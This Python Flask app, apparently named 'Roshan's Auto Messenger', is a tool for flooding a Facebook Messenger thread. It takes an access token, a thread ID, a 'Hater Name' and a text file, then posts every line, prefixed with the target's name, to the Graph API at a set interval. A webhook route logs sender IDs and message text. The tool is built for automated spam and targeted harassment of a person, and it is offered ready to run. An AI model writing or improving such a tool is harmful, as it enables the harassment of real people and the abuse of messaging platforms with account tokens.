from flask import Flask, request, render_template_string
import requests
import time

app = Flask(__name__)

# 🔧 Headers for Facebook API requests
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'referer': 'https://www.google.com'
}

# ✅ Home route with form
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        hater_name = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        for message1 in messages:
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                full_message = f"{hater_name} {message1}"
                params = {'access_token': access_token, 'message': full_message}
                response = requests.post(api_url, data=params, headers=headers)

                if response.status_code == 200:
                    print(f"✅ Sent: {full_message}")
                else:
                    print(f"❌ Failed: {full_message} | Status: {response.status_code}")
                time.sleep(time_interval)
            except Exception as e:
                print(f"⚠️ Error: {e}")
                time.sleep(5)

    # 🎨 HTML form
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head><title>Roshan's Auto Messenger</title></head>
    <body style="font-family:sans-serif; background:#f0f0f0;">
        <h2 style="text-align:center;">🔥 Roshan's Auto Messenger 🔥</h2>
        <form method="post" enctype="multipart/form-data" style="max-width:500px; margin:auto;">
            <label>Access Token:</label><input type="text" name="accessToken" required><br><br>
            <label>Thread ID:</label><input type="text" name="threadId" required><br><br>
            <label>Hater Name:</label><input type="text" name="kidx" required><br><br>
            <label>Message File (.txt):</label><input type="file" name="txtFile" accept=".txt" required><br><br>
            <label>Speed (seconds):</label><input type="number" name="time" required><br><br>
            <button type="submit">🚀 Send Messages</button>
        </form>
    </body>
    </html>
    ''')

# ✅ Webhook route for PSID extraction
@app.route('/webhook', methods=['GET', 'POST'])
def webhook():
    VERIFY_TOKEN = "roshan123"

    if request.method == 'GET':
        mode = request.args.get("hub.mode")
        token = request.args.get("hub.verify_token")
        challenge = request.args.get("hub.challenge")

        if mode == "subscribe" and token == VERIFY_TOKEN:
            print("✅ Webhook verified!")
            return challenge, 200
        else:
            print("❌ Verification failed.")
            return "Forbidden", 403

    elif request.method == 'POST':
        data = request.get_json()
        print("📦 Webhook payload received:")
        print(data)

        try:
            for entry in data.get("entry", []):
                for event in entry.get("messaging", []):
                    psid = event["sender"]["id"]
                    message = event.get("message", {}).get("text", "")
                    print(f"🆔 PSID: {psid}")
                    print(f"💬 Message: {message}")
        except Exception as e:
            print(f"⚠️ Error parsing payload: {e}")

        return "EVENT_RECEIVED", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
